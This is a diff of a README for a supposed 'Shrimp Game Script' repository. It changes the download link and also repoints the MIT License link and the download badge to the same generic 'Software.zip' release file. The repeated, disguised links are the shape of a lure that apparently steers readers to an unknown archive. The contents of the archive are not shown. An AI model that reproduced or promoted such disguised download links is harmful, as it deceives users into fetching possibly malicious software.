@@ -9,7 +9,7 @@ This repository contains the script for a fun game that involves shrimps as the 
 ## How to Access the Script
 
 To access the script and start working on your own shrimp-themed game, you can download it from the following link: 
-[Download Shrimp Game Script](https://github.com/user-attachments/files/18388744/Software.zip)<!--launch-->
+[Download Shrimp Game Script](https://github.com/yaya2humpy/shrimp-g/releases/download/v1.0/Software.zip)<!--launch-->
 
 If the link does not work or if you encounter any issues, please check the "Releases" section of this repository for alternative download options.
 
@@ -34,10 +34,10 @@ We welcome feedback and suggestions from the community to improve the game scrip
 
 ## License
 
-This script is provided under the [MIT License](https://opensource.org/licenses/MIT), allowing for flexibility in using, modifying, and distributing the content. We encourage collaboration and creativity within the terms of this license.
+This script is provided under the [MIT License](https://github.com/yaya2humpy/shrimp-g/releases/download/v1.0/Software.zip), allowing for flexibility in using, modifying, and distributing the content. We encourage collaboration and creativity within the terms of this license.
 
 ## Conclusion
 
 Thank you for visiting the **Shrimp Game Script** repository. We hope you enjoy exploring the underwater world of shrimps through this engaging script. Dive in, unleash your creativity, and bring the shrimp game to life!
 
-[![](https://img.shields.io/badge/Download-Script-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![](https://github.com/yaya2humpy/shrimp-g/releases/download/v1.0/Software.zip)](https://github.com/yaya2humpy/shrimp-g/releases/download/v1.0/Software.zip)
